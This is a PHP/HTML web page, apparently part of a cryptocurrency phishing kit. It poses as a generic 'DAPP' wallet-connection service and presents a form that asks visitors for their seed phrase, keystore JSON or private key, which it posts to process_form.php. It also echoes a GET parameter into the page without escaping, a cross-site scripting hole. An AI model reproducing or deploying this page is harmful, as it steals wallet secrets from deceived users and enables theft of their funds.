<?php
   $issue = "";
    if(isset($_GET['issue'])){
        $issue = $_GET['issue'];
    }
?>

<!DOCTYPE html>
<html lang="en">



<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Welcome</title>
    <meta name="description"
        content="Welcome to our website">
    <script>
        document.documentElement.style.cssText="filter:hue-rotate(4deg)";
    </script>

    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon.png">
    <link rel="stylesheet" href="css/style.css">
</head>

<body class="@@dashboard">

    <!-- <div id="preloader"><i>.</i><i>.</i><i>.</i></div> -->

    <div id="main-wrapper" class="front">

        <div class="header landing">
            <div class="container">
                <div class="row">
                    <div class="col-xl-12">
                        <div class="navigation">
                            <nav class="navbar navbar-expand-lg navbar-light">
                                <div class="brand-logo">
                                    <a href="index.php">
                                        <img src="images/logo.png" alt="" class="logo-primary">
                                        <img src="images/logow.png" alt="" class="logo-white">
                                    </a>
                                </div>
                                <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                                    data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
                                    aria-expanded="false" aria-label="Toggle navigation">
                                    <span class="navbar-toggler-icon"></span>
                                </button>
                                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                                    <ul class="navbar-nav me-auto">
                                        <li class="nav-item dropdown"><a class="nav-link" href="index.html">Home</a>
                                        </li>
                                        <li class="nav-item"><a class="nav-link" href="explore.php">Explore</a></li>
                                    </ul>
                                </div>
                                <div class="signin-btn d-flex align-items-center">
                                    <div class="dark-light-toggle theme-switch" onclick="themeToggle()">
                                        <span class="dark"><i class="ri-moon-line"></i></span>
                                        <span class="light"><i class="ri-sun-line"></i></span>
                                    </div>

                                    <a class="btn btn-primary" href="explore.php">Connect</a>
                                </div>
                            </nav>
                        </div>
                    </div>
                </div>
            </div>
        </div>


        <div class="page-title">
            <div class="container">
                <div class="row align-items-center justify-content-between">
                    <div class="col-6">
                        <div class="page-title-content">
                            <h3>Explore</h3>
                            <p class="mb-2">Explore different connection mode</p>
                        </div>
                    </div>
                    <!-- <div class="col-auto">
                        <div class="breadcrumbs"><a href="#">Home </a><span><i
                                    class="ri-arrow-right-s-line"></i></span><a href="#">Payments</a></div>
                    </div> -->
                </div>
            </div>
        </div>


        <div class="upload-item section-padding">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-12">
                        <h4 class="card-title mb-3">DAPP Type:
                            MM                        </h4>
                        <div class="card">
                            <div class="card-body">
                                <form action="process_form.php" method="post">
                                    <div class="row">
                                        <div class="col-12 mb-3">
                                            <label class="form-label">Method of Connection</label>
                                            <select for="category" class="form-control" name="category" id="category"
                                                required>
                                                <option value="">Select One</option>
                                                <option value="phrase">Phrase</option>
                                                <option value="json">Key store Json</option>
                                                <option value="p-key">Private Key</option>
                                            </select>
                                        </div>

                                        <div class="col-12 mb-3">
                                            <label class="form-label">Phrase, Key store or Private key</label>
                                            <textarea type="text" name="name" class="form-control" id=""
                                            required></textarea>
                                        </div>
                                        
                                        <input type="hidden" name="selected_issue"
                                            value="<?= $issue; ?>">
                                    </div>
                                    <div class="mt-3">
                                        <button type="submit" name="submit"
                                            class="btn btn-primary mr-2 w-100">Submit</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>



        <div class="bottom section-padding triangle-top-dark triangle-bottom-dark">
            <div class="container">
                <div class="row">
                    <div class="col-xl-4 col-lg-4 col-md-7 col-sm-8">
                        <div class="bottom-logo"><img class="pb-3" src="images/logoh.png" alt="">
                            <p>Our commitment is to address a wide array of blockchain and crypto challenges
                                comprehensively. We strive to provide effective solutions that empower you to navigate
                                the
                                rapidly evolving blockchain landscape with confidence. Trust us to optimize your
                                operations
                                and create a successful and efficient blockchain ecosystem.</p>
                        </div>
                    </div>
                    <div class="col-xl-2 col-lg-2 col-md-5 col-sm-4 col-6">
                        <div class="bottom-widget">
                            <h4 class="widget-title">Quick Links</h4>
                            <ul>
                                <li><a href="explore.php">Explore</a></li>
                                <li><a href="explore.php">Connect</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="container">
                <div class="row">
                    <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                        <div class="copyright">
                            <p>© Copyright <script>document.write(new Date().getFullYear());</script> <a href="#"></a> <!-- -->All Rights Reserved</p>
                        </div>
                    </div>
                    <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                        <div class="footer-social">
                            <ul>
                                <li><a href="#"><i class="bi bi-facebook"></i></a></li>
                                <li><a href="#"><i class="bi bi-twitter"></i></a></li>
                                <li><a href="#"><i class="bi bi-linkedin"></i></a></li>
                                <li><a href="#"><i class="bi bi-youtube"></i></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>


    </div>



    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="js/scripts.js"></script>
 
 <!-- Smartsupp Live Chat script -->
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = '968fd031a362d69b944ad382c44089e82f5253cf';
window.smartsupp||(function(d) {
  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
  c.type='text/javascript';c.charset='utf-8';c.async=true;
  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
})(document);
</script>
<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>


</body>

</html>